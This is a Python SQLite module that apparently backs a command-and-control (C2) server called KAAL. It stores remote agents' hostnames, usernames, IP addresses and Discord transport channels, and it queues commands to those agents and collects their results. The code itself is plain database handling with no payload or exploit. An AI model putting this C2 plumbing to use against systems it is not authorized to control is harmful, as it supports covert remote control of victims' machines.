"""
KAAL Database — SQLite persistence for agents, tasks, and results.
Uses aiosqlite for async compatibility with FastAPI.
Falls back to synchronous sqlite3 if aiosqlite is not installed.
"""
import sqlite3
import json
import uuid
import logging
from datetime import datetime
from pathlib import Path
from typing import Optional, List, Dict, Any

log = logging.getLogger("kaal.db")

DB_PATH = Path(__file__).resolve().parent.parent / "kaal.db"


class Database:
    """Synchronous SQLite wrapper (thread-safe with check_same_thread=False).

    Using sync sqlite3 avoids adding an aiosqlite dependency. All calls are
    fast enough (local disk) that blocking the event loop is negligible for
    a single-operator C2.
    """

    def __init__(self, path: Path = DB_PATH):
        self.path = path
        self.conn: Optional[sqlite3.Connection] = None

    # ─────────── Lifecycle ───────────

    def connect(self):
        self.conn = sqlite3.connect(str(self.path), check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.conn.execute("PRAGMA journal_mode=WAL")
        self.conn.execute("PRAGMA foreign_keys=ON")
        self._create_tables()
        log.info(f"Database connected: {self.path}")

    def close(self):
        if self.conn:
            self.conn.close()
            self.conn = None

    def _create_tables(self):
        self.conn.executescript("""
            CREATE TABLE IF NOT EXISTS agents (
                id              TEXT PRIMARY KEY,
                platform        TEXT DEFAULT 'unknown',
                hostname        TEXT DEFAULT 'unknown',
                username        TEXT DEFAULT 'unknown',
                internal_ip     TEXT DEFAULT '0.0.0.0',
                public_ip       TEXT,
                first_seen      TEXT NOT NULL,
                last_seen       TEXT NOT NULL,
                status          TEXT DEFAULT 'active',
                connection_type TEXT DEFAULT 'direct',
                transport_type  TEXT DEFAULT 'discord',
                transport_id    TEXT,
                capabilities    TEXT DEFAULT '[]',
                seq_in          INTEGER DEFAULT -1,
                seq_out         INTEGER DEFAULT 0,
                integrity_hash  TEXT,
                transport_health TEXT DEFAULT 'healthy',
                last_error      TEXT
            );

            CREATE TABLE IF NOT EXISTS agent_events (
                id              INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id        TEXT NOT NULL,
                event_type      TEXT NOT NULL, -- Handshake, Cmd, Error, etc.
                severity        TEXT DEFAULT 'INFO',
                message         TEXT,
                timestamp       TEXT NOT NULL,
                FOREIGN KEY (agent_id) REFERENCES agents(id)
            );

            CREATE TABLE IF NOT EXISTS tasks (
                id              TEXT PRIMARY KEY,
                agent_id        TEXT NOT NULL,
                command         TEXT NOT NULL DEFAULT '',
                parameters      TEXT DEFAULT '{}',
                status          TEXT DEFAULT 'pending',
                created_at      TEXT NOT NULL,
                sent_at         TEXT,
                completed_at    TEXT,
                result          TEXT,
                error           TEXT,
                FOREIGN KEY (agent_id) REFERENCES agents(id)
            );

            CREATE TABLE IF NOT EXISTS results (
                id              TEXT PRIMARY KEY,
                task_id         TEXT,
                agent_id        TEXT NOT NULL,
                type            TEXT DEFAULT 'result',
                data            TEXT DEFAULT '{}',
                received_at     TEXT NOT NULL,
                FOREIGN KEY (agent_id) REFERENCES agents(id)
            );

            CREATE INDEX IF NOT EXISTS idx_tasks_agent ON tasks(agent_id);
            CREATE INDEX IF NOT EXISTS idx_tasks_status ON tasks(status);
            CREATE INDEX IF NOT EXISTS idx_results_agent ON results(agent_id);
        """)
        self.conn.commit()

    # ─────────── Agent Operations ───────────

    def upsert_agent(self, agent_data: Dict[str, Any]) -> Dict[str, Any]:
        """Insert or update an agent record. Returns the stored record."""
        agent_id = agent_data["id"]
        now = datetime.now().isoformat()
        existing = self.get_agent(agent_id)

        if existing:
            existing = dict(existing)
            # Update — preserve first_seen
            self.conn.execute("""
                UPDATE agents SET
                    platform = ?, hostname = ?, username = ?,
                    internal_ip = ?, public_ip = ?,
                    last_seen = ?, status = ?,
                    connection_type = ?, transport_type = ?,
                    transport_id = ?, capabilities = ?,
                    integrity_hash = ?, transport_health = ?, last_error = ?
                WHERE id = ?
            """, (
                agent_data.get("platform", existing["platform"]),
                agent_data.get("hostname", existing["hostname"]),
                agent_data.get("username", existing["username"]),
                agent_data.get("internal_ip", existing["internal_ip"]),
                agent_data.get("public_ip", existing.get("public_ip")),
                now,
                agent_data.get("status", "active"),
                agent_data.get("connection_type", existing["connection_type"]),
                agent_data.get("transport_type", existing.get("transport_type", "discord")),
                agent_data.get("transport_id", existing.get("transport_id")),
                agent_data.get("capabilities", existing.get("capabilities", "[]")),
                agent_data.get("integrity_hash", existing.get("integrity_hash")),
                agent_data.get("transport_health", existing.get("transport_health", "healthy")),
                agent_data.get("last_error", existing.get("last_error")),
                agent_id
            ))
        else:
            # Insert
            self.conn.execute("""
                INSERT INTO agents
                    (id, platform, hostname, username, internal_ip, public_ip,
                     first_seen, last_seen, status, connection_type,
                     transport_type, transport_id, capabilities, integrity_hash)
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)
            """, (
                agent_id,
                agent_data.get("platform", "unknown"),
                agent_data.get("hostname", "unknown"),
                agent_data.get("username", "unknown"),
                agent_data.get("internal_ip", "0.0.0.0"),
                agent_data.get("public_ip"),
                now, now,
                "active",
                agent_data.get("connection_type", "direct"),
                agent_data.get("transport_type", "discord"),
                agent_data.get("transport_id"),
                agent_data.get("capabilities", "[]"),
                agent_data.get("integrity_hash"),
            ))
        self.conn.commit()
        return dict(self.get_agent(agent_id))

    def log_event(self, agent_id: str, event_type: str, message: str, severity: str = "INFO"):
        """Log a specialized agent lifecycle event to the DB."""
        now = datetime.now().isoformat()
        self.conn.execute("""
            INSERT INTO agent_events (agent_id, event_type, severity, message, timestamp)
            VALUES (?, ?, ?, ?, ?)
        """, (agent_id, event_type, severity, message, now))
        self.conn.commit()

    def update_agent_sequences(self, agent_id: str, seq_in: int, seq_out: int):
        """Persist sequence numbers for restart-resilience."""
        self.conn.execute(
            "UPDATE agents SET seq_in = ?, seq_out = ? WHERE id = ?",
            (seq_in, seq_out, agent_id)
        )
        self.conn.commit()

    def get_agent(self, agent_id: str) -> Optional[sqlite3.Row]:
        cur = self.conn.execute("SELECT * FROM agents WHERE id = ?", (agent_id,))
        return cur.fetchone()

    def get_all_agents(self) -> List[Dict[str, Any]]:
        cur = self.conn.execute("SELECT * FROM agents ORDER BY last_seen DESC")
        return [dict(row) for row in cur.fetchall()]

    def update_agent_heartbeat(self, agent_id: str):
        now = datetime.now().isoformat()
        self.conn.execute(
            "UPDATE agents SET last_seen = ?, status = 'active' WHERE id = ?",
            (now, agent_id)
        )
        self.conn.commit()

    def mark_agent_offline(self, agent_id: str):
        self.conn.execute(
            "UPDATE agents SET status = 'offline' WHERE id = ?",
            (agent_id,)
        )
        self.conn.commit()

    def delete_agent(self, agent_id: str):
        """Permanently delete an agent and all its associated data."""
        self.conn.execute("DELETE FROM results WHERE agent_id = ?", (agent_id,))
        self.conn.execute("DELETE FROM tasks WHERE agent_id = ?", (agent_id,))
        self.conn.execute("DELETE FROM agent_events WHERE agent_id = ?", (agent_id,))
        self.conn.execute("DELETE FROM agents WHERE id = ?", (agent_id,))
        self.conn.commit()

    def set_agent_transport_id(self, agent_id: str, transport_id: str):
        """Store per-agent Discord channel ID."""
        self.conn.execute(
            "UPDATE agents SET transport_id = ? WHERE id = ?",
            (transport_id, agent_id)
        )
        self.conn.commit()

    def get_agent_transport_id(self, agent_id: str) -> Optional[str]:
        cur = self.conn.execute(
            "SELECT transport_id FROM agents WHERE id = ?", (agent_id,)
        )
        row = cur.fetchone()
        return row["transport_id"] if row else None

    # ─────────── Task Operations ───────────

    def create_task(self, agent_id: str, command: str,
                    parameters: Optional[Dict] = None,
                    task_id: Optional[str] = None) -> str:
        """Create a new task and return its ID."""
        tid = task_id or str(uuid.uuid4())[:8]
        now = datetime.now().isoformat()
        self.conn.execute("""
            INSERT INTO tasks (id, agent_id, command, parameters, status, created_at)
            VALUES (?, ?, ?, ?, 'pending', ?)
        """, (tid, agent_id, command, json.dumps(parameters or {}), now))
        self.conn.commit()
        return tid

    def get_task(self, task_id: str) -> Optional[Dict[str, Any]]:
        cur = self.conn.execute("SELECT * FROM tasks WHERE id = ?", (task_id,))
        row = cur.fetchone()
        return dict(row) if row else None

    def get_pending_tasks(self, agent_id: str) -> List[Dict[str, Any]]:
        cur = self.conn.execute(
            "SELECT * FROM tasks WHERE agent_id = ? AND status = 'pending' ORDER BY created_at",
            (agent_id,)
        )
        return [dict(r) for r in cur.fetchall()]

    def get_agent_tasks(self, agent_id: str, limit: int = 50) -> List[Dict[str, Any]]:
        """Get task history for an agent (most recent first)."""
        cur = self.conn.execute(
            "SELECT * FROM tasks WHERE agent_id = ? ORDER BY created_at DESC LIMIT ?",
            (agent_id, limit)
        )
        return [dict(r) for r in cur.fetchall()]

    def update_task_status(self, task_id: str, status: str,
                           result: Optional[str] = None,
                           error: Optional[str] = None):
        now = datetime.now().isoformat()
        if status == "sent":
            self.conn.execute(
                "UPDATE tasks SET status = ?, sent_at = ? WHERE id = ?",
                (status, now, task_id)
            )
        elif status in ("completed", "failed"):
            self.conn.execute(
                "UPDATE tasks SET status = ?, completed_at = ?, result = ?, error = ? WHERE id = ?",
                (status, now, result, error, task_id)
            )
        else:
            self.conn.execute(
                "UPDATE tasks SET status = ? WHERE id = ?",
                (status, task_id)
            )
        self.conn.commit()

    def clear_pending_tasks(self, agent_id: str) -> int:
        """Delete all pending tasks for an agent. Returns count cleared."""
        cur = self.conn.execute(
            "SELECT COUNT(*) as cnt FROM tasks WHERE agent_id = ? AND status = 'pending'",
            (agent_id,)
        )
        count = cur.fetchone()["cnt"]
        self.conn.execute(
            "DELETE FROM tasks WHERE agent_id = ? AND status = 'pending'",
            (agent_id,)
        )
        self.conn.commit()
        return count

    # ─────────── Result Operations ───────────

    def save_result(self, agent_id: str, result_type: str,
                    data: Any, task_id: Optional[str] = None) -> str:
        rid = str(uuid.uuid4())[:8]
        now = datetime.now().isoformat()
        self.conn.execute("""
            INSERT INTO results (id, task_id, agent_id, type, data, received_at)
            VALUES (?, ?, ?, ?, ?, ?)
        """, (rid, task_id, agent_id, result_type, json.dumps(data), now))
        self.conn.commit()
        return rid


# ─────────── Singleton ───────────
db = Database()
